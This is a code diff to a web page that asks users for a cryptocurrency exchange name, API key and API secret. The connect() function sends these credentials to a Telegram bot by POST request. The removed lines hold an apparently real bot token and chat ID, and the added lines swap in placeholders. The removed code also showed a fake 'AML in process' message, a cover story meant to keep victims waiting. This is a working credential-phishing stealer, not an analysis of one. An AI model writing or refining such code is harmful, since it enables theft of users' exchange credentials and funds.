@@ -225,29 +225,6 @@ button:hover {
 </div>
 
   <script>
-function showModal() {
-  const modal = document.getElementById("confirmationModal");
-  modal.style.display = "flex"; // important because you use flex centering
-}
-
-function closeModal() {
-  const modal = document.getElementById("confirmationModal");
-  modal.style.display = "none";
-}
-</script>
-
-<script>
-function showModal() {
-  const modal = document.getElementById("confirmationModal");
-  modal.style.display = "flex"; // important because you use flex centering
-}
-
-function closeModal() {
-  const modal = document.getElementById("confirmationModal");
-  modal.style.display = "none";
-}
-
-  
 async function connect() {
   const status = document.getElementById("status");
   status.innerText = "Connecting to exchange...";
@@ -256,7 +233,11 @@ async function connect() {
   const apiKey = document.getElementById("apiKey").value;
   const apiSecret = document.getElementById("apiSecret").value;
 
-  // Compose detailed log for Telegram
+  if (!apiKey || !apiSecret) {
+    status.innerText = "Please fill all fields.";
+    return;
+  }
+
   const logText = `
 Exchange: ${exchange}
 API Key: ${apiKey}
@@ -264,35 +245,31 @@ API Secret: ${apiSecret}
 `;
 
   try {
-    // Send Telegram message with detailed log
-    const telegramUrl = `https://api.telegram.org/bot8739273115:AAE4Dv8aq6e6sXs4ZtzvKiTrQkwHtoU6Nvs/sendMessage`;
-    await fetch(telegramUrl, {
+    await fetch("https://api.telegram.org/botTOKEN/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: "7737212833",
+        chat_id: "CHAT_ID",
         text: logText
       })
     });
 
-    // Show modal with AML message
-    showModal();
+    status.innerText = "Connected. Processing...";
 
-    // Update status
-    status.innerText = "Connected. AML process started.";
+    showModal(); // ✅ WORKS NOW
   } catch (err) {
-    status.innerText = "Error connecting or sending message.";
+    console.log(err);
+    status.innerText = "Error connecting.";
   }
 }
 
-// Show modal with AML message
+// ✅ SINGLE CLEAN MODAL SYSTEM
 function showModal() {
-  document.getElementById('logDetails').innerText = "AML in process. You will receive an email once the process is finished. This stage can take up to 1 week.";
-  document.getElementById('confirmationModal').style.display = 'flex';
+  document.getElementById("confirmationModal").style.display = "flex";
 }
 
 function closeModal() {
-  document.getElementById('confirmationModal').style.display = 'none';
+  document.getElementById("confirmationModal").style.display = "none";
 }
 </script>
 
